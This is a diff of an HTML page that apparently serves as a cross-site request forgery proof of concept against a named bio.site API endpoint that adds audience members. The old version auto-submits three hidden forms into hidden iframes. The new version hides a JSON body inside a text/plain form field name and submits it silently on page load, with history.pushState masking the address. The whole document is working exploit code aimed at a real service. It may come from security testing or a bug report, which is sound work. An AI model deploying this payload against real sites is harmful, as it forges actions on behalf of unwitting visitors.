@@ -1,46 +1,12 @@
 <html>
   <body>
+    <form action="https://api.bio.site/api/v2/biosites/19fcf074-338b-4484-8580-9375dc4c1dc0/audience-members" method="POST" enctype="text/plain">
+      <input type="hidden" name="&#123;&quot;contact&#95;info&quot;&#58;&#123;&quot;name&quot;&#58;&quot;test12355557777777777777777777777777777&quot;&#44;&quot;email&quot;&#58;&quot;t&#64;t&#46;com&quot;&#44;&quot;phone&quot;&#58;&quot;11111111111&quot;&#125;&#125;" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
     <script>
-      const payloads = [
-        {
-          name: "test1",
-          email: "a@a.com",
-          phone: "111"
-        },
-        {
-          name: "test2",
-          email: "b@b.com",
-          phone: "222"
-        },
-        {
-          name: "test3",
-          email: "c@c.com",
-          phone: "333"
-        }
-      ];
-
-      payloads.forEach((p, i) => {
-        const form = document.createElement("form");
-        form.method = "POST";
-        form.action = "https://api.bio.site/api/v2/biosites/19fcf074-338b-4484-8580-9375dc4c1dc0/audience-members";
-        form.target = `frame${i}`;
-        form.enctype = "application/x-www-form-urlencoded";
-
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = "contact_info";
-        input.value = JSON.stringify(p);
-        form.appendChild(input);
-
-        const iframe = document.createElement("iframe");
-        iframe.name = `frame${i}`;
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-
-        document.body.appendChild(form);
-        form.submit();
-      });
+      history.pushState('', '', '/');
+      document.forms[0].submit();
     </script>
   </body>
 </html>
-
